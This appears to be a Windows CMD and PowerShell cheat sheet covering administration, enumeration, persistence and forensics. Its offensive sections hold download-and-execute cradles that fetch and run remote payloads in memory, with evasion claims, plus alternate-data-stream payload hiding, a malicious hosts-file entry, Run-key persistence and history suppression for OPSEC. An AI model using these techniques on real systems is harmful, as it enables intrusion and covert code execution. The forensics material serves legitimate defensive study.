---
title: "Windows CMD & PowerShell Cheat Sheet"
description: "Comprehensive guide for Windows administration, enumeration, persistence, and forensics using both Command Prompt (CMD) and PowerShell."
draft: false
tags:
  - "Windows"
  - "PowerShell"
  - "CMD"
  - "Cheat Sheet"
---

# Windows CMD & PowerShell Cheat Sheet

A comprehensive guide for Windows administration, enumeration, persistence, and forensics using both Command Prompt (CMD) and PowerShell.

---

## System & Network Administration

Core administrative tasks for configuring Windows hosts, setting up network interfaces, and managing environment variables.

<Tabs>
  <Tab title="Hostname & Domain Join">
    <Info title="Rename Computer & Join Domain">
      Requires Administrative privileges and a restart to take effect.
    </Info>

    **PowerShell:**

    ```powershell
    # 1. Rename the computer
    Rename-Computer -NewName "WS-001" -Force -PassThru
    
    # 2. Join Domain (will prompt for credentials)
    Add-Computer -DomainName "adolf.local" -Credential (Get-Credential) -Force -Restart
    ```

    **CMD:**

    ```cmd
    :: Rename computer
    wmic computersystem where name="%COMPUTERNAME%" call rename "WS-001"
    
    :: Join Domain
    netdom join %COMPUTERNAME% /domain:adolf.local /userd:adolf\Administrator /passwordd:* /reboot:5
    ```
  </Tab>
  <Tab title="Set IP & DNS">
    **PowerShell:**

    ```powershell
    # View network interfaces
    Get-NetAdapter
    
    # Set Static IP (InterfaceAlias, IP, PrefixLength, Gateway)
    New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress "192.168.1.100" -PrefixLength 24 -DefaultGateway "192.168.1.1"
    
    # Set DNS Servers
    Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses ("8.8.8.8", "8.8.4.4")
    
    # Set to DHCP (Dynamic IP)
    Set-NetIPInterface -InterfaceAlias "Ethernet0" -Dhcp Enabled
    ```

    **CMD (netsh):**

    ```cmd
    :: Set Static IP and Gateway
    netsh interface ip set address "Ethernet0" static 192.168.1.100 255.255.255.0 192.168.1.1
    
    :: Set DNS
    netsh interface ip set dns "Ethernet0" static 8.8.8.8
    ```
  </Tab>
  <Tab title="Environment Variables">
    <Warning title="Scopes">
      Environment variables can be set temporarily (Session only), permanently for the Current User, or permanently for the System (Machine).
    </Warning>

    **PowerShell:**

    ```powershell
    # 1. Temporary (Session Only)
    $env:MY_VAR = "TempValue"
    
    # 2. Permanent (Current User)
    [Environment]::SetEnvironmentVariable("MY_VAR", "UserValue", "User")
    
    # 3. Permanent (System / Machine)
    [Environment]::SetEnvironmentVariable("MY_VAR", "SystemValue", "Machine")
    
    # Read Environment Variable
    [Environment]::GetEnvironmentVariable("MY_VAR", "User")
    $env:MY_VAR
    ```

    **CMD:**

    ```cmd
    :: Temporary (Session Only)
    set MY_VAR=TempValue
    
    :: Permanent (User)
    setx MY_VAR "UserValue"
    
    :: Permanent (System / Machine - requires Admin)
    setx MY_VAR "SystemValue" /M
    ```
  </Tab>
</Tabs>

---

## Execution & History

Managing execution context and clearing tracks.

<Tabs>
  <Tab title="Execution Context">
    ```cmd
    :: Run process as another user
    runas /user:administrator cmd
    runas /user:adolf.local\adolf /netonly cmd
    ```
  </Tab>
  <Tab title="PowerShell History">
    ```powershell
    # PowerShell History Management
    Get-History
    Clear-History # Note: Does not clear the file completely
    
    # Find and read the history file path
    Get-PSReadLineOption | Select HistorySavePath
    type <path_from_above>
    
    # Stop saving history (OPSEC)
    Set-PSReadLineOption -HistorySaveStyle SaveNothing
    $profile | select *
    ```
  </Tab>
</Tabs>

---

## Network & Host Configuration

Monitoring connections and manipulating local host files.

<Tabs>
  <Tab title="Modify Hosts File">
    Add malicious entries to redirect traffic (e.g., phishing or DLL hijacking).

    ```powershell
    Add-Content -Path C:\windows\system32\drivers\etc\hosts -Value "10.10.75.1 www1-googleanalytics.com"
    ```
  </Tab>
  <Tab title="Port & Service Scanning">
    Find active connections and scan internal ports.

    ```cmd
    netstat -an # Active and listening ports
    netstat -ab # Active ports and executable binary
    ```

    ```powershell
    # Network Connections
    Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,OwningProcess
    
    # Port Scanner Script (1..1024)
    foreach ($port in 1..1024) {If (($a=Test-NetConnection 172.20.10.1 -Port $port -WarningAction SilentlyContinue).tcpTestSucceeded -eq $true){ "TCP port $port is open!"}}
    ```
  </Tab>
</Tabs>

---

## SMB Enumeration & Management

Enumerate shares, map drives, and manage sessions.

<Tabs>
  <Tab title="CMD">
    ```cmd
    net share  # Show shared folders
    net use    # Show mapped drives
    net share * /delete
    net use * /delete
    net share hi=C:\Users\Administrator\Desktop
    net use z: \\localip\hi password /user:administrator
    net use \\TargetIP\ipc$ "" /u:""  # Null session
    net view    # Show computers
    net view \\172.20.10.1 /ALL 
    nbtstat -A x.x.x.x
    nbtstat -c
    ```
  </Tab>
  <Tab title="PowerShell">
    ```powershell
    Get-SmbShare
    Get-SmbSession
    Get-CimInstance -Class win32_share -ComputerName 172.20.10.1
    
    # Close session and change user password
    $Password = Read-Host -AsSecureString
    Set-LocalUser -Name scezar -Password $Password
    Close-SmbSession -ClientComputerName 10.10.75.1 -Force
    ```
  </Tab>
</Tabs>

---

## Process Management

Monitor and terminate processes.

<Tabs>
  <Tab title="Get-Process">
    ```powershell
    Get-Process
    Stop-Process
    Get-Process | Select-Object -Property Path, Name, Id | Where-Object -Property Name -eq explorer
    Get-Process lsass | Select-Object -Property *
    Get-process 'powersh*' | Select-object * # Detailed
    Get-Process -Computername 172.20.10.1 # Remote
    Get-Process dynamics | Stop-Process
    ```
  </Tab>
  <Tab title="CIM (Common Information Model)">
    CIM gives us more detailed process info, including command lines.

    ```powershell
    # List processes with command lines
    Get-CimInstance -Class Win32_Process | Select-Object ProcessId, ProcessName, CommandLine
    
    # Find child processes of LSASS (ParentProcessId)
    $lsass_pid = (Get-Process 'lsass').Id
    Get-CimInstance -Class Win32_Process | Where-Object -Property ParentProcessId -EQ $lsass_pid
    ```
  </Tab>
</Tabs>

---

## System Info, Services & Users

<AccordionGroup>
  <Accordion title="System & Services">
    <Tabs>
      <Tab title="CMD">
        ```cmd
        :: Sysinternals tools
        psgetsid
        psloggedon
        
        :: Service management
        net stop wampapache
        net start wampapache
        sc delete dynamics
        ```
      </Tab>
      <Tab title="PowerShell">
        ```powershell
        Get-Service
        Stop-Service -Name Dynamics
        Start-Service nameservice
        
        # Service Permissions
        icacls "C:\Users\bin\xamps"
        Get-ACL
        
        # Detailed Service Info
        Get-CimInstance -ClassName Win32_Service | Format-List Name,Caption,Description,PathName
        
        # Compare Services (Baseline vs Current)
        $old = Get-Content .\baseline-services-20220325.txt
        $current = Get-Content .\services-liveinvestigation.txt
        Compare-Object -ReferenceObject $old -DifferenceObject $current
        ```
      </Tab>
    </Tabs>
  </Accordion>

  <Accordion title="User & Group Management (T1136)">
    <Tabs>
      <Tab title="CMD">
        ```cmd
        net users   # Show local users
        net user adolf
        net users /domain  # Show domain users
        whoami /groups
        whoami /priv
        net localgroup administrators
        net user /add <user> <password>
        net user <user> /active:yes
        net localgroup administrators <user> /add
        ```
      </Tab>
      <Tab title="PowerShell">
        ```powershell
        Get-LocalUser
        Get-LocalUser | Where-Object Enabled -eq $True
        Get-LocalGroup
        Get-LocalGroupMember Administrators
        ```
      </Tab>
    </Tabs>
  </Accordion>
</AccordionGroup>

---

## File Operations & Steganography

<Danger>
  Hide payloads inside legitimate files using ADS.

  ```cmd
  :: Standard hidden file
  attrib +s +h +r file.txt
  dir -r # Show hidden context
  
  :: ADS Injection
  type payload.exe > syslog.txt:mal.exe
  del payload.exe
  
  :: Create symlink to execute ADS payload
  mklink C:\Windows\System32\hi.exe C:\temp\syslog.txt:mal.exe
  ```
</Danger>

<Info>
  ```powershell
  # Find specific files (e.g., KeePass databases or Office Docs)
  Get-ChildItem -Path 'C:\' -Include '*.kdbx' -File -Recurse -ErrorAction SilentlyContinue
  Get-ChildItem -Path C:\Users\adolf -Include *.xls,*.xlsx,*.pdf,*.txt -File -Recurse -ErrorAction SilentlyContinue
  
  # Hashing & Strings
  Get-FileHash file -Algorithm SHA1
  Get-Content .\services.txt -First 10
  ```
</Info>

<Warning>
  Attackers often use Base64 encoded commands.

  ```powershell
  powershell -EncodedCommand <base64_string> # or -e
  ```

  _Decode online at:_ [CyberChef](https://gchq.github.io/CyberChef)
</Warning>

---

## Download Files & In-Memory Execution

<Tabs>
  <Tab title="Filesystem Downloads">
    These methods save the file directly to the hard drive. Easier to use, but more likely to be caught by AV.

    <Tabs>
      <Tab title="Certutil (CMD)">
        ```cmd
        certutil -urlcache -f http://192.158.23.1/payload.exe payload.exe
        ```
      </Tab>
      <Tab title="Bitsadmin (CMD)">
        Slow but stealthy, bypasses IDS/IPS.

        ```cmd
        bitsadmin /transfer exploit.exe http://1p/exploit.exe C:\service.exe
        ```
      </Tab>
      <Tab title="Invoke-WebRequest (PS)">
        ```powershell
        iwr -uri http://172.20.10.1/file.exe -Outfile winPEAS.exe
        ```
      </Tab>
    </Tabs>
  </Tab>
  <Tab title="In-Memory Execution (Fileless)">
    Using `IEX` (Invoke-Expression) allows scripts to be downloaded and executed directly in RAM without touching the disk.

    ```powershell
    # Method 1: Net.WebClient
    IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/s.ps1')
    
    # Method 2: Invoke-WebRequest
    IEX (iwr 'http://x.x.x.x/s.ps1' -UseBasicParsing).Content
    ```
  </Tab>
  <Tab title="COM Objects (Stealth)">
    COM objects can bypass execution policies and application whitelisting.

    ```powershell
    # Method 1: Msxml2.XMLHTTP
    $h = New-Object -ComObject Msxml2.XMLHTTP
    $h.open('GET','http://x.x.x.x/evil.ps1',$false)
    $h.send()
    IEX $h.ResponseText
    
    # Method 2: WinHttp.WinHttpRequest.5.1 (Often unmonitored)
    $w = New-Object -ComObject WinHttp.WinHttpRequest.5.1
    $w.Open('GET','http://x.x.x.x/evil.ps1',$false)
    $w.Send()
    IEX $w.ResponseText
    ```
  </Tab>
  <Tab title=".NET Framework">
    If Constrained Language Mode (CLM) blocks Cmdlets, use .NET classes directly.

    ```powershell
    # Download Data as Byte Array (for invoking assemblies)
    $bytes = (New-Object System.Net.WebClient).DownloadData('http://x.x.x.x/payload.exe')
    [Reflection.Assembly]::Load($bytes) | Out-Null
    [Program]::Main()
    ```
  </Tab>
</Tabs>

---

## Registry & Persistence

<Tabs>
  <Tab title="Registry Navigation">
    The Windows Registry is structured like a file system. Top-level keys are drives, nested keys are folders, and properties are files.

    ```powershell
    # 1. Navigation (Aliases: cd, dir)
    cd HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    dir
    
    # 2. Read (Get-ItemProperty)
    # List installed software
    Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select displayname
    
    # Check Run keys for persistence
    Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
    Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    
    # 3. Create / Modify (Set-ItemProperty) - [T1112 Modify Registry]
    # Syntax: Set-ItemProperty -Path <Key> -Name <ValueName> -Value <Data> -Type <DataType>
    # If the value doesn't exist, it creates it. If it does, it overwrites it.
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\Windows\Temp\payload.exe" -PropertyType String
    
    # 4. Create New Key (New-Item)
    New-Item -Path "HKCU:\Software\MyMalwareConfig" -Force
    
    # 5. Delete (Remove-ItemProperty) - Remove Persistence
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater"
    ```

    <Info title="Common Registry Value Types (PropertyType)">
      - **String** (REG_SZ): Standard string value.
      - **ExpandString** (REG_EXPAND_SZ): String with unexpanded environment variables (e.g., `%SystemRoot%`).
      - **Binary** (REG_BINARY): Binary data.
      - **DWord** (REG_DWORD): 32-bit number (Common for flags and 0/1 settings).
      - **QWord** (REG_QWORD): 64-bit number.
      - **MultiString** (REG_MULTI_SZ): Array of strings.
    </Info>
  </Tab>
  <Tab title="Scheduled Tasks">
    Attackers use scheduled tasks for persistence (e.g., trigger script on logon failure).

    ```cmd
    schtasks /query /fo LIST /v
    ```

    ```powershell
    Get-ScheduledTask
    Get-ScheduledTask *Avast* | Select-Object TaskName
    Export-ScheduledTask -TaskName 'AvastUpdatre'
    Get-ScheduledTaskInfo -TaskName 'AvastUpdatre' | Select-Object LastRunTime
    Unregister-ScheduledTask -TaskName "Microsoft eDynamics"
    ```
  </Tab>
</Tabs>

---

## Windows Forensics & Event Logs

<AccordionGroup>
  <Accordion title="Windows Event Viewer (Important Event IDs)">
    Monitor for unauthorized access and process creation.

    - `4624`: An account was successfully logged on.
    - `4634`: An account was logged off.
    - `4672`: Special privileges assigned to new logon.
    - `4732`: A member was added to a security-enabled local group.
    - `4648`: A logon was attempted using explicit credentials.
    - `4688`: A new process has been created.
    - `4697`: A service was installed in the system.
    - `4768`: A Kerberos authentication ticket (TGT) was requested.

    ```powershell
    $start = Get-Date 3/1/2022
    $end = Get-Date 3/31/2022
    Get-WinEvent -FilterHashtable @{LogName='Security'; StartTime=$start; EndTime=$end}
    
    # Find hidden services installed
    Get-WinEvent -FilterHashtable @{ LogName='System'; Id='7045'}
    ```
  </Accordion>
</AccordionGroup>

### Memory Investigation (Volatility)

Capture and analyze RAM to find malicious processes.

<Steps>
  <Step title="Step 1: Capture Memory (WinPmem)">
    ```powershell
    .\winpmem_mini.exe .\win10.0.22000.556.raw
    ```
  </Step>
  <Step title="Step 2: Analyze with Volatility3">
    ```bash
    vol -q -f win10.0.22000.556.raw windows.pslist.PsList
    vol -q -f win10.0.22000.556.raw windows.pstree.PsTree
    vol -q -f win10.0.22000.556.raw windows.netscan.NetScan
    vol -q -f win10.0.22000.556.raw windows.cmdline.CmdLine
    ```
  </Step>
</Steps>
